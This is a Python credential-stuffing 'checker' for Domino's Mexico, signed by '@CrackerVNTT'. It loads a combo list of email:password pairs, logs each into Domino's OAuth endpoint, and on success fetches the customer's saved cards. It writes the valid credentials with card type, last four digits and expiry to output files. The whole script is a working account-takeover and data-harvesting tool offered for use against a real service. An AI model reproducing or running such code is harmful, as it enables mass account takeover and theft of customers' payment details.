import requests
import calendar
import datetime
import time
import os
fail = 0

def check():



    while (True):
        print("          Checker Dominos MX [1.0]   ")
        print("              By: @CrackerVNTT      ")
        try:
            database_name = input("Combo: ")
            database = open(database_name, 'r')
            break
        except:
            print("No se encontro el archivo")
            time.sleep(5)
            os.system('cls')
    accs = database.readlines()

    with open('hist.txt', 'w') as valids:
        with open('free.txt', 'w') as freep:
          for acc in accs:
            try:
                email = acc.split(':')[0]
                passwords = acc.split(':')[1].split("\n")[0]

                session_data = "grant_type=password&validator_id=VoldemortCredValidator&client_id=nolo&scope=customer%3Acard%3Aread+customer%3Aprofile%3Aread%3Aextended+customer%3AorderHistory%3Aread+customer%3Acard%3Aupdate+customer%3Aprofile%3Aread%3Abasic+customer%3Aloyalty%3Aread+customer%3AorderHistory%3Aupdate+customer%3Acard%3Acreate+customer%3AloyaltyHistory%3Aread+order%3Aplace%3AcardOnFile+customer%3Acard%3Adelete+customer%3AorderHistory%3Acreate+customer%3Aprofile%3Aupdate+easyOrder%3AoptInOut+easyOrder%3Aread&username="+email+"&password="+passwords
                headers = {

                    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                    'dpz-language': 'es',
                    'dpz-market': 'MEXICO',
                    'market': 'MEXICO',
                    'origin': 'https://api-golo01.dominos.com',
                    'referer': 'https://api-golo01.dominos.com/assets/build/xdomain/proxy.html',
                    'sec-ch-ua': '\"Not?A_Brand\";v=\"8\", \"Chromium\";v=\"108\", \"Google Chrome\";v=\"108\"',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platfoxr': '\"Windows\"',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'same-origin',
                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36',
                    'x-dpz-d': '62645d3f-c1d9-4a22-b28f-38debbdff05b',
                }
                res_sesion = requests.post("https://api-golo01.dominos.com/as/token.oauth2", data=session_data, headers=headers)

                if res_sesion.status_code == 400:
                    fail+1
                elif res_sesion.status_code == 200:
                    

                    check = res_sesion.json()
                    acceso_token = check["access_token"]

                    headerss = {
                        'authorization': f'Bearer {acceso_token}',
                        'content-type': 'application/json',
                        'dpz-language': 'es',
                        'dpz-market': 'MEXICO',
                        'market': 'MEXICO',
                        'origin': 'https://api-golo01.dominos.com',
                        'referer': 'https://api-golo01.dominos.com/assets/build/xdomain/proxy.html',
                        'sec-ch-ua': '\"Not?A_Brand\";v=\"8\", \"Chromium\";v=\"108\", \"Google Chrome\";v=\"108\"',
                        'sec-ch-ua-mobile': '?0',
                        'sec-ch-ua-platfoxr': '\"Windows\"',
                        'sec-fetch-dest': 'empty',
                        'sec-fetch-mode': 'cors',
                        'sec-fetch-site': 'same-origin',
                        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36',
                        'x-dpz-d': '62645d3f-c1d9-4a22-b28f-38debbdff05b',
                    }
                    dataf = "loyaltyIsActive=false&rememberMe=true&gRecaptchaRespons="
                    capture = requests.post("https://order.golo01.dominos.com/power/login", data=dataf, headers=headerss)
                    parsers = capture.json()
                    id = parsers["CustomerID"]

                    headersfinal = {
                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
                        'authorization': f'Bearer {acceso_token}'
                    }
                    date = datetime.datetime.utcnow()
                    utc_time = calendar.timegm(date.utctimetuple())

                    content = requests.get(f'https://order.golo01.dominos.com/power/customer/{id}/card?_={utc_time}', headers=headersfinal)

                    if '[]' in content.text:
                        print(f'[+] {email}:{passwords}')
                        freep.write(f'{email}:{passwords} | By: @CrackerVNTT' + '\n')
                    else:

                        fullcap = content.json()
                        tipe = fullcap[0]['cardType']
                        cc = fullcap[0]["lastFour"]
                        mes = fullcap[0]["expirationMonth"]
                        year = fullcap[0]["expirationYear"]
                        captures = f'Tipo: {tipe} | CC: *****{cc} | Mes: {mes} | Year: {year}'
                        print(f'[+] {email}:{passwords} | {captures}')
                        valids.write(f'{email}:{passwords} | {captures} | By: @CrackerVNTT' + '\n')
               
            except:
                print("[-] Formato archivo incorrecto")

    time.sleep(5)
    print("Checking Terminadoooooo.............")

check()
